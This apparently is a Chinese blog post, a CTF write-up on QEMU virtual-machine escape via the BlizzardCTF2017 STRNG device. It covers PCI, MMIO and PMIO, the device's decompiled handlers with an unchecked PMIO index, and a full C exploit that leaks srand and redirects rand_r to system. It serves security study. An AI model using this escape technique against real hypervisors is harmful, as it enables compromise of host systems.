<!doctype html><html lang=zh-cn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Qemu Escape ---- 以BlizzardCTF2017_STRNG为例 | hhdx's blog</title>
<meta name=keywords content="CTF,Qemu"><meta name=description content="最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。
本文主要参考raycp师傅的两篇文章。[1] [2]
Qemu概述
每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。

qemu的内存结构，根据QEMU Case Study，虚拟机对应的内存结构为如下：


 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25


                        Guest' processes
                     +--------------------+
Virtual addr space   |                    |
                     +--------------------+
                     |                    |
                     \__   Page Table     \__
                        \                    \
                         |                    |  Guest kernel
                    +----+--------------------+----------------+
Guest's phy. memory |    |                    |                |
                    +----+--------------------+----------------+
                    |                                          |
                    \__                                        \__
                       \                                          \
                        |             QEMU process                 |
                   +----+------------------------------------------+
Virtual addr space |    |                                          |
                   +----+------------------------------------------+
                   |                                               |
                    \__                Page Table                   \__
                       \                                               \
                        |                                               |
                   +----+-----------------------------------------------++
Physical memory    |    |                                               ||
                   +----+-----------------------------------------------++


"><meta name=author content="hhdx"><link rel=canonical href=https://hhdx.xyz/post/qemu-pwn/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://hhdx.xyz/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hhdx.xyz/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hhdx.xyz/favicon-32x32.png><link rel=apple-touch-icon href=https://hhdx.xyz/apple-touch-icon.png><link rel=mask-icon href=https://hhdx.xyz/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=https://hhdx.xyz/post/qemu-pwn/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hhdx.xyz/post/qemu-pwn/"><meta property="og:site_name" content="hhdx's blog"><meta property="og:title" content="Qemu Escape ---- 以BlizzardCTF2017_STRNG为例"><meta property="og:description" content="最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。
本文主要参考raycp师傅的两篇文章。[1] [2]
Qemu概述 每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。
qemu的内存结构，根据QEMU Case Study，虚拟机对应的内存结构为如下：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 Guest' processes +--------------------+ Virtual addr space | | +--------------------+ | | \__ Page Table \__ \ \ | | Guest kernel +----+--------------------+----------------+ Guest's phy. memory | | | | +----+--------------------+----------------+ | | \__ \__ \ \ | QEMU process | +----+------------------------------------------+ Virtual addr space | | | +----+------------------------------------------+ | | \__ Page Table \__ \ \ | | +----+-----------------------------------------------++ Physical memory | | || +----+-----------------------------------------------++ "><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-11-23T15:05:17+00:00"><meta property="article:modified_time" content="2020-11-23T15:05:17+00:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Qemu"><meta name=twitter:card content="summary"><meta name=twitter:title content="Qemu Escape ---- 以BlizzardCTF2017_STRNG为例"><meta name=twitter:description content="最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。
本文主要参考raycp师傅的两篇文章。[1] [2]
Qemu概述
每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。

qemu的内存结构，根据QEMU Case Study，虚拟机对应的内存结构为如下：


 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25


                        Guest' processes
                     +--------------------+
Virtual addr space   |                    |
                     +--------------------+
                     |                    |
                     \__   Page Table     \__
                        \                    \
                         |                    |  Guest kernel
                    +----+--------------------+----------------+
Guest's phy. memory |    |                    |                |
                    +----+--------------------+----------------+
                    |                                          |
                    \__                                        \__
                       \                                          \
                        |             QEMU process                 |
                   +----+------------------------------------------+
Virtual addr space |    |                                          |
                   +----+------------------------------------------+
                   |                                               |
                    \__                Page Table                   \__
                       \                                               \
                        |                                               |
                   +----+-----------------------------------------------++
Physical memory    |    |                                               ||
                   +----+-----------------------------------------------++


"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hhdx.xyz/post/"},{"@type":"ListItem","position":2,"name":"Qemu Escape ---- 以BlizzardCTF2017_STRNG为例","item":"https://hhdx.xyz/post/qemu-pwn/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Qemu Escape ---- 以BlizzardCTF2017_STRNG为例","name":"Qemu Escape ---- 以BlizzardCTF2017_STRNG为例","description":"最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。\n本文主要参考raycp师傅的两篇文章。[1] [2]\nQemu概述 每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。\nqemu的内存结构，根据QEMU Case Study，虚拟机对应的内存结构为如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 Guest\u0026#39; processes +--------------------+ Virtual addr space | | +--------------------+ | | \\__ Page Table \\__ \\ \\ | | Guest kernel +----+--------------------+----------------+ Guest\u0026#39;s phy. memory | | | | +----+--------------------+----------------+ | | \\__ \\__ \\ \\ | QEMU process | +----+------------------------------------------+ Virtual addr space | | | +----+------------------------------------------+ | | \\__ Page Table \\__ \\ \\ | | +----+-----------------------------------------------++ Physical memory | | || +----+-----------------------------------------------++ ","keywords":["CTF","Qemu"],"articleBody":"最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。\n本文主要参考raycp师傅的两篇文章。[1] [2]\nQemu概述 每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。\nqemu的内存结构，根据QEMU Case Study，虚拟机对应的内存结构为如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 Guest' processes +--------------------+ Virtual addr space | | +--------------------+ | | \\__ Page Table \\__ \\ \\ | | Guest kernel +----+--------------------+----------------+ Guest's phy. memory | | | | +----+--------------------+----------------+ | | \\__ \\__ \\ \\ | QEMU process | +----+------------------------------------------+ Virtual addr space | | | +----+------------------------------------------+ | | \\__ Page Table \\__ \\ \\ | | +----+-----------------------------------------------++ Physical memory | | || +----+-----------------------------------------------++ qemu虚拟机进程会使用mmap分配出对应大小的内存空间，作为虚拟机的物理内存。\n以STRNG启动命令为例：\n1 2 3 4 5 6 7 8 9 10 11 #!/bin/sh ./qemu-system-x86_64 \\ -m 1G \\ -device strng \\ -hda my-disk.img \\ -hdb my-seed.img \\ -nographic \\ -L pc-bios/ \\ -device e1000,netdev=net0 \\ -netdev user,id=net0,hostfwd=tcp::5555-:22 其使用-m参数指定虚拟机内存大小为1G，启动虚拟机后查看其maps。(sudo gdb, 然后attach pid)\n1 2 3 4 5 6 7 8 9 10 ... 0x7fe71ab00000 0x7fe71ac00000 rw-p 100000 0 0x7fe71ac00000 0x7fe71bc00000 rw-p 1000000 0 0x7fe71bc00000 0x7fe71bc01000 ---p 1000 0 0x7fe71bcff000 0x7fe71bd00000 ---p 1000 0 0x7fe71bd00000 0x7fe71be00000 rw-p 100000 0 0x7fe71be00000 0x7fe75be00000 rw-p 40000000 0 # mmap 0x7fe75be00000 0x7fe75be01000 ---p 1000 0 0x7fe75beff000 0x7fe75bf00000 ---p 1000 0 ... 如何在qemu进程中找到虚拟机中分配的内存呢？\n首先将qemu虚拟机中的虚拟地址转化为物理地址，这个物理地址就是mmap空间的偏移，使用mmap基址加上这个偏移，就是对应的qemu进程空间地址中地址。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 #include #include #include #include #include #include #include #define PAGE_SHIFT 12 #define PAGE_SIZE (1 \u003c\u003c PAGE_SHIFT) #define PFN_PRESENT (1ull \u003c\u003c 63) #define PFN_PFN ((1ull \u003c\u003c 55) - 1) int fd; uint32_t page_offset(uint32_t addr) { return addr \u0026 ((1 \u003c\u003c PAGE_SHIFT) - 1); } /* /proc/pid/pagemap * Bits 0-54 page frame number (PFN) if present * Bits 0-4 swap type if swapped * Bits 5-54 swap offset if swapped * Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt) * Bit 56 page exclusively mapped (since 4.2) * Bits 57-60 zero * Bit 61 page is file-page or shared-anon (since 3.5) * Bit 62 page swapped * Bit 63 page present */ uint64_t gva_to_gfn(void *addr) { uint64_t pme, gfn; size_t offset; offset = ((uintptr_t)addr \u003e\u003e 9) \u0026 ~7; lseek(fd, offset, SEEK_SET); read(fd, \u0026pme, 8); // page frame num，指的是右移12位后的页号 if (!(pme \u0026 PFN_PRESENT)) return -1; gfn = pme \u0026 PFN_PFN; return gfn; } uint64_t gva_to_gpa(void *addr) { uint64_t gfn = gva_to_gfn(addr); assert(gfn != -1); return (gfn \u003c\u003c PAGE_SHIFT) | page_offset((uint64_t)addr); } int main() { uint8_t *ptr; uint64_t ptr_mem; fd = open(\"/proc/self/pagemap\", O_RDONLY); if (fd \u003c 0) { perror(\"open\"); exit(1); } ptr = malloc(256); strcpy(ptr, \"Where am I?\"); printf(\"%s\\n\", ptr); ptr_mem = gva_to_gpa(ptr); printf(\"Your physical address is at 0x%\"PRIx64\"\\n\", ptr_mem); getchar(); return 0; } PCI PCI是Peripheral Component Interconnect（外围设备互联）的简称，是普遍使用在桌面及更大型的计算机上的外设总线。PCI架构被设计为ISA标准的替代品，它有三个主要目标：获得在计算机和外设之间传输数据时更好的性能；尽可能的平台无关；简化往系统中添加和 删除外设的工作。\nPCI是一种外设总线规范。我们先来看一下什么是总线：总线是一种传输信号的路径或信道。典型情况是，总线是连接于一个或多个导体的电气连线，总线上连接的所有设备可在同一时间收到所有的传输内容。总线由电气接口和编程接口组成。\nPCI总线主要有三部分：\nPCI 设备。符合 PCI 总线标准的设备就被称为 PCI 设备，PCI 总线架构中可以包含多个 PCI 设备。 PCI 总线。PCI 总线在系统中可以有多条，类似于树状结构进行扩展，每条 PCI 总线都可以连接多个 PCI 设备/桥。 PCI桥。当一条 PCI 总线的承载量不够时，可以用新的 PCI 总线进行扩展，而 PCI 桥则是连接 PCI 总线之间的纽带。 1 2 3 4 5 6 7 8 $ lspci 00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02) 00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II] 00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II] 00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03) 00:02.0 VGA compatible controller: Device 1234:1111 (rev 02) 00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10) 00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03) PCI寻址 直接来看一个具体的列子。/proc/iomem描述了系统内所有的设备在地址空间中的映射。(/proc/ioports描述了设备端口的映射)\n1 2 3 4 5 6 7 8 $ lspci ... 00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10) ... $ cat /proc/iomem ... febf1000-febf10ff : 0000:00:03.0 ... 这是一个PCI设备，febf1000-febf10ff是它所映射的内存地址空间，占据了256bytes，0000:00:03.0则是这个PCI外设的地址，以冒号和点号分割成4部分，第一步16位表示域，第二个8位表示一个总线编号，第三个5位表示一个设备号，最后3位，表示功能号。\nPCI规范允许单个系统最多拥有256条总线，所以总线编号为8位。但对于大型系统来说，这是不够的，所以引入了域的概念，每个PCI域最多拥有256条总线，每条总线最多拥有32个设备，所以为5位，而每个设备最多可有8中功能，所以为3位。\n对于普通PC而言，一般只有一个域。\nPCI设备配置空间 PCI设备都有一个配置空间(PCI Configuration Space)，记录了该设备的详细信息。大小为256字节，其中前64字节是PCI标准规定的，并非所有字段必须填写，没用到的可以填充0。\n其中的关键是BAR(Base Address Register)字段，记录了设备所需的地址空间及类型等属性。\nMemory Space BAR Layout\n31 - 4 3 2 - 1 0 16-Byte Aligned Base Address Prefetchable Type Always 0 I/O Space BAR Layout\n31 - 2 1 0 4-Byte Aligned Base Address Reserved Always 1 地址空间的类型包括Memory Space和I/O Space。使用BAR的最低bit区分。\nMemory Space，最低bit始终为0。type字段为0x00表示使用32bit地址，0x02表示使用64bit地址（64bit的BAR使用两个空间存储基址），0x01为PCI规范修订版3保留，早先版本使用bit1来支持低于1MB的地址空间。Prefetchable字段表示是否可以预取。\nBAR基址的计算：\n16bit—-BAR[x] \u0026 0xFFF0；\n32bit—-BAR[x] \u0026 0xFFFFFFF0；\n64bit—-(BAR[x] \u0026 0xFFFFFFF0) + ((BAR[x+1] \u0026 0xFFFFFFFF) « 32)\nI/O Space，最低bit为1，一般不支持预取。\n通过Memory Space访问设备I/O称为Memory-Mapped I/O(MMIO)，CPU直接使用普通的访存指令即可进行I/O。\n通过I/O Space访问设备I/O称为Port I/O或者Port-Mapped I/O(PMIO)，这种情况下CPU使用专门的I/O指令（如IN/OUT）访问I/O端口。\n可以通过查看resource文件，获得其MMIO和PMIO的地址/端口等信息。同一文件夹下面还有resource0和resource1文件，resource0对应mmio空间，resource1对应pmio空间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ cat /sys/devices/pci0000\\:00/0000\\:00\\:03.0/resource 0x00000000febf1000 0x00000000febf10ff 0x0000000000040200 0x000000000000c050 0x000000000000c057 0x0000000000040101 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识位（flags）。\n更多关于PCI的说明可以看这篇文章https://zhuanlan.zhihu.com/p/26244141\nQOM QEMU提供了一套面向对象编程的模型——QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。\n由于qemu模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解C++或其它面向对象语言来理解QOM。\n有几个比较关键的结构体，TypeInfo、TypeImpl、ObjectClass以及Object。其中ObjectClass、Object、TypeInfo定义在include/qom/object.h中，TypeImpl定义在qom/object.c中。\n对于这块的理解，直接读两个简单的例子比较方便。例子1 例子2\n进一步可以读读这两篇文章（不太必要，看完我依旧云里雾里的。。）文章一 文章二\nBlizzardCTF2017-STRNG 题目在repository的release中可以下载到\nDebugging 使用gdbscript\n1 2 3 4 5 6 7 8 9 10 $ cat gdbscript aslr off b strng_instance_init b strng_pmio_read b strng_pmio_write run -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22 $ gdb -q qemu-system-x86_64 gdb\u003e source gdbscript MMIO strng_mmio_read 1 2 3 4 5 6 7 8 9 uint64_t __fastcall strng_mmio_read(STRNGState *opaque, hwaddr addr, unsigned int size) { uint64_t result; // rax result = -1LL; if ( size == 4 \u0026\u0026 !(addr \u0026 3) ) result = opaque-\u003eregs[addr \u003e\u003e 2]; return result; } 只能读4个字节且\"地址\"必须4字节对齐，将地址转换成index读取数据。\nstrng_mmio_write 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size) { hwaddr idx; // rsi int v5; // eax int vala; // [rsp+8h] [rbp-30h] if ( size == 4 \u0026\u0026 !(addr \u0026 3) ) { idx = addr \u003e\u003e 2; if ( (_DWORD)idx == 1 ) { opaque-\u003eregs[1] = ((__int64 (__fastcall *)(STRNGState *, hwaddr, uint64_t))opaque-\u003erand)(opaque, idx, val); } else if ( (unsigned int)idx \u003c 1 ) { opaque-\u003esrand(val); } else { if ( (_DWORD)idx == 3 ) { vala = val; v5 = opaque-\u003erand_r(\u0026opaque-\u003eregs[2]); LODWORD(val) = vala; opaque-\u003eregs[3] = v5; } opaque-\u003eregs[(unsigned int)idx] = val; } } } idx=0时，调用srand(val)设置随机种子\nidx=1时，调用rand()设置随机值到regs[1]\nidx\u003e=3时，将val设置到regs[idx]\n看起来idx没有限制，但是PCI设备会进行内部的检查，因为PCI注册的MMIO空间大小只有256字节。\n编程进行MMIO 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 uint8_t *mmio_mem; void mmio_write(uint32_t addr, uint32_t value) { *((uint32_t*)(mmio_mem + addr)) = value; } uint32_t mmio_read(uint32_t addr) { return *((uint32_t*)mmio_mem + addr) } int main(int argc, char *argv[]) { int mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:03.0/resource0\", O_RDWR|O_SYNC); if (mmio_fd == -1) die(\"open mmio_fd failed\"); mmio_mem = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mmio_fd, 0); if (mmio_mem == MAP_FAILED) die(\"mmap mmio_mem failed\") } PMIO strng_pmio_read 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size) { uint64_t result; // rax uint32_t v4; // edx result = -1LL; if ( size == 4 ) { if ( addr ) { if ( addr == 4 ) { v4 = opaque-\u003eaddr; if ( !(v4 \u0026 3) ) result = opaque-\u003eregs[v4 \u003e\u003e 2]; } } else { result = opaque-\u003eaddr; } } return result; } 这里也可以发现，这些函数中的addr，都是起始端口/地址的偏移。\n如果操作号(addr)是0，则读取存储的地址；\n如果操作号是4，则读取地址处的值(regs[addr»2])。\nstrng_pmio_write 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size) { uint32_t v4; // eax __int64 idx; // rax if ( size == 4 ) { if ( addr ) { if ( addr == 4 ) { v4 = opaque-\u003eaddr; if ( !(v4 \u0026 3) ) { idx = v4 \u003e\u003e 2; if ( (_DWORD)idx == 1 ) { opaque-\u003eregs[1] = ((__int64 (__fastcall *)(STRNGState *, __int64, uint64_t))opaque-\u003erand)(opaque, 4LL, val); } else if ( (unsigned int)idx \u003c 1 ) { opaque-\u003esrand(val); } else if ( (_DWORD)idx == 3 ) { opaque-\u003eregs[3] = ((__int64 (__fastcall *)(uint32_t *, __int64, uint64_t))opaque-\u003erand_r)( \u0026opaque-\u003eregs[2], 4LL, val); } else { opaque-\u003eregs[idx] = val; } } } } else { opaque-\u003eaddr = val; } } } 操作号为0，则设置地址addr；\n操作号为4，则写入数据。\nidx=0，srand设置种子\nidx=1，regs[1]=rand()\nidx=3，regs[3]=rand_r(\u0026opaque-\u003eregs[2])\nidx\u003e3，regs[idx]=val\n这里看起来有机可乘，没有对PMIO的addr进行检查。\n编程进行PMIO 使用中的outb/inb，outw/inw，outl/inl函数。\n访问相应的端口需要一定的权限，程序应使用root权限执行。对于0x000-0x3ff之间的端口，使用ioperm(from, num turn_on)即可；对于0x3ff以上的端口，应调用iopl(3)去获取权限。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 uint32_t pmio_base = 0xc050; uint32_t pmio_write(uint32_t addr, uint32_t value) { outl(value, addr); } uint32_t pmio_read(uint32_t addr) { return (uint32_t)inl(addr); } int main(int argc, char *argv[]) { if (iopl(3) != 0) die(\"iopl failed\"); pmio_write(pmio_base+0, 0); pmio_read(pmio_base+4, 1); } 利用 exp和脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 #include #include #include #include #include #include #include #define MAP_SIZE 4096 uint8_t *mmio_mem; uint32_t pmio_base = 0xc050; char *mmio_path = \"/sys/devices/pci0000:00/0000:00:03.0/resource0\"; void die(char *msg) { perror(msg); exit(-1); } uint32_t mmio_read(uint32_t addr) { return *((uint32_t *)(mmio_mem + addr)); } void mmio_write(uint32_t addr, uint32_t value) { *((uint32_t *)(mmio_mem + addr)) = value; } uint32_t pmio_read(uint32_t addr) { return (uint32_t)inl(addr); } void pmio_write(uint32_t addr, uint32_t value) { outl(value, addr); } uint32_t arb_read(uint32_t addr) { pmio_write(pmio_base+0, addr); return pmio_read(pmio_base+4); } void arb_write(uint32_t addr, uint32_t value) { pmio_write(pmio_base+0, addr); pmio_write(pmio_base+4, value); } int main(int argc, char *argv[]) { // change I/O privilege level if (iopl(3) != 0) die(\"iopl failed\"); // mmap device mmio space int fd; if ((fd=open(mmio_path, O_RDWR|O_SYNC)) \u003c 0) { perror(\"open device mmio failed\"); exit(-1); } mmio_mem = mmap(0, MAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0); if (mmio_mem == MAP_FAILED) { perror(\"mmap failed\"); exit(-1); } /* $ python3 \u003e\u003e\u003e from pwn import * \u003e\u003e\u003e list(map(hex, unpack_many(b\"cat /root/flag \"))) # string align with 4 ['0x20746163', '0x6f6f722f', '0x6c662f74', '0x20206761'] */ mmio_write(0x8, 0x20746163); mmio_write(0xc, 0x6f6f722f); mmio_write(0x10, 0x6c662f74); mmio_write(0x14, 0x20206761); // mmio_write(0x8, 0x20006873); // system(\"sh\"); freeze after print \"sh: turning off NDELAY mode\" uint64_t srand_addr = arb_read(0x108); srand_addr = (arb_read(0x104) | (srand_addr\u003c\u003c32)); uint64_t system_addr = srand_addr + 0xac50; arb_write(0x114, system_addr\u00260xffffffff); mmio_write(0xc, 0); return 0; } tips 打印struct偏移\n1 2 3 gdb\u003e print (int)\u0026((STRNGState*)0)-\u003esrand gdb\u003e ptype /o STRNGState pwndbg\u003e dt STRNGState pahole导出elf中的structs\n1 2 $ sudo apt install dwarves $ pahole -V qemu-system-x86_64 \u003e structs # 导出并不完全，STRNGState不会被找到，是因为typedef的原因？ 后记 要做出来STRNG这道题目，很关键的一点就是发现STRNGState结构体，知道了这个，那几个read、write函数就没有那么抽象了，漏洞也很清晰明了，所以这是很关键的问题。但是我看的几个WriteUp都没有说如何确定的这个结构。这可能就是比赛时solves: 0的原因吧。\n尝试一：以state为关键字，在ida的structures标签页中搜索结构体，搜不到。\n尝试二：使用pahole导出struct，也没有\n后来看源码发现这个结构体是被typedef成了STRNDState的名字，本身并没有名字，这是不是上面找不到的原因？\n(PS: disqus判定评论是否为spam的检查太垃圾了，在raycp大佬文章下面发了两个评论询问这个问题，都被这个gdx屏蔽了)\n前期花了太多的时间想彻底搞明白qemu虚拟设备的创建(经常会有这种莫名的强迫症…)，但是看来看去都模模糊糊的，是真的菜啊我。察觉这个状态后，想起教主的“先干起来，慢慢补充”，才继续关注题目本身。其实看两个简单的虚拟设备例子，做这个题目就没问题了。\n2020-11-28\n在ida的local types窗口可以检索到STRNGState\nReference qemu-pwn-基础知识 qemu pwn-Blizzard CTF 2017 Strng writeup BlizzardCTF 2017 - Strng osdev PCI BAR lspci命令详解 ","wordCount":"5078","inLanguage":"zh-cn","datePublished":"2020-11-23T15:05:17Z","dateModified":"2020-11-23T15:05:17Z","author":{"@type":"Person","name":"hhdx"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hhdx.xyz/post/qemu-pwn/"},"publisher":{"@type":"Organization","name":"hhdx's blog","logo":{"@type":"ImageObject","url":"https://hhdx.xyz/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hhdx.xyz/ accesskey=h title="hhdx's blog (Alt + H)">hhdx's blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hhdx.xyz/ title=主页><span>主页</span></a></li><li><a href=https://hhdx.xyz/post/ title=归档><span>归档</span></a></li><li><a href=https://hhdx.xyz/tags/ title=标签><span>标签</span></a></li><li><a href=https://hhdx.xyz/underway/ title=施工中><span>施工中</span></a></li><li><a href=https://hhdx.xyz/about/ title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Qemu Escape ---- 以BlizzardCTF2017_STRNG为例</h1><div class=post-meta><span title='2020-11-23 15:05:17 +0000 UTC'>November 23, 2020</span>&nbsp;·&nbsp;hhdx</div></header><div class=post-content><p>最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。</p><p>本文主要参考raycp师傅的两篇文章。[1] [2]</p><h2 id=qemu概述>Qemu概述<a hidden class=anchor aria-hidden=true href=#qemu概述>#</a></h2><p>每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。</p><p><img alt=qemu-architecture loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/imgqemu-architecture.png></p><p>qemu的内存结构，根据<a href=http://www.phrack.org/papers/vm-escape-qemu-case-study.html>QEMU Case Study</a>，虚拟机对应的内存结构为如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>                        Guest&#39; processes
</span></span><span class=line><span class=cl>                     +--------------------+
</span></span><span class=line><span class=cl>Virtual addr space   |                    |
</span></span><span class=line><span class=cl>                     +--------------------+
</span></span><span class=line><span class=cl>                     |                    |
</span></span><span class=line><span class=cl>                     \__   Page Table     \__
</span></span><span class=line><span class=cl>                        \                    \
</span></span><span class=line><span class=cl>                         |                    |  Guest kernel
</span></span><span class=line><span class=cl>                    +----+--------------------+----------------+
</span></span><span class=line><span class=cl>Guest&#39;s phy. memory |    |                    |                |
</span></span><span class=line><span class=cl>                    +----+--------------------+----------------+
</span></span><span class=line><span class=cl>                    |                                          |
